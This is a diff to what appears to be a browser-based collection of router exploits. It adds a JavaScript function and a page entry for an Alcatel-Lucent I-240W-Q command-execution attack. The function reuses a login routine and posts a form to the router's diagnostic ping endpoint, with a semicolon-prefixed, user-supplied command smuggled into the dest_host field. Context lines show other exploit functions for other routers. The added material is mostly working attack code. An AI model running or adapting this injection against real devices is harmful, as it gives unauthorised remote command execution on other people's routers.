@@ -1577,6 +1577,21 @@ function i230w_auth(ip)
 	post('http://' + ip + '/GponForm/LoginForm', form);
 }
 
+// Alcatel Lucent I-240W-Q - Command Execution
+function i240w_command(ip)
+{
+
+	ip = ip || "192.168.1.254";
+
+	cmd = prompt("Command:");
+	i230w_auth(ip);
+	form = '<input value="index" name="XWebPageName" value="diag" />\
+	<input value="index" name="diag_action" value="ping" />\
+	<input value="index" name="wan_conlist" value="0" />\
+	<input value="index" name="dest_host" value="%3B'+ encodeURI(cmd) + '"/>' ;
+	post('http://' + ip + '/GponForm/diag_XForm', form);
+}
+
 function N900_xss_psk(ip)
 {
 	ip = ip || "192.168.2.1";
@@ -1996,6 +2011,13 @@ a=a+1
 </section><br><br><section id="alcatellucent">
 <h2>Alcatel-Lucent</h2>
 <h3><a href="javascript:img('I-240W-Q')">I-240W-Q</a></h3>
+
+<article>
+	<div>19/12/13</div>
+	<div><a href="http://www.websec.mx/advisories/view/Ejecuci%C3%B3n-de-comandos-en-Alcatel-Lucent-I-240W-Q">[+]</a></div>
+	<div><a href="javascript:i240w_command()">Alcatel Lucent I-240W-Q - Command Execution</a></div>
+	<div><a href="javascript:i240w_command(ip)" onclick="return ip=prompt('IP:');">[SET IP]</a></div>
+</article>
 
 <article>
 	<div>12/02/13</div>
